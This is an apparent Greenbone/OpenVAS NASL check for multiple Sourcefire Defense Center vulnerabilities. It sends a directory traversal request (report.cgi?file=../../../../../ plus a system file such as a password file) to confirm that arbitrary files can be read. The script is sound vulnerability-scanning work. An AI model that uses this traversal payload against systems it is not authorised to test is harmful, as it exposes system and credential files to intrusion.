if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103460" );
	script_bugtraq_id( 52887 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Sourcefire Defense Center Multiple Security Vulnerabilities" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-04-05 11:02:10 +0200 (Thu, 05 Apr 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Updates are available. Please see the reference for more details." );
	script_tag( name: "summary", value: "Sourcefire Defense Center is prone to multiple security
  vulnerabilities, including multiple arbitrary-file-download
  vulnerabilities, an arbitrary-file-deletion vulnerability, a security-
  bypass vulonerability, and an HTML-injection vulnerability." );
	script_tag( name: "impact", value: "Exploiting these vulnerabilities may allow an attacker to view or
  delete arbitrary files within the context of the application, gain
  unauthorized access and execute HTML and script code in the context of
  the affected site, steal cookie-based authentication credentials, or
  control how the site is rendered to the user. Information harvested
  may aid in launching further attacks." );
	script_tag( name: "affected", value: "Sourcefire Defense Center versions prior to 4.10.2.3 are vulnerable." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52887" );
	script_xref( name: "URL", value: "http://www.sourcefire.com/products/3D/defense_center" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Apr/52" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/login.cgi";
	if(http_vuln_check( port: port, url: url, pattern: "Sourcefire Inc" )){
		files = traversal_files();
		for pattern in keys( files ) {
			file = files[pattern];
			url = "/ComparisonViewer/report.cgi?file=../../../../../" + file;
			if(passwd = http_vuln_check( port: port, url: url, pattern: pattern )){
				desc = "Url: " + url + "\nResult:\n" + passwd + "\n";
				security_message( port: port, data: desc );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

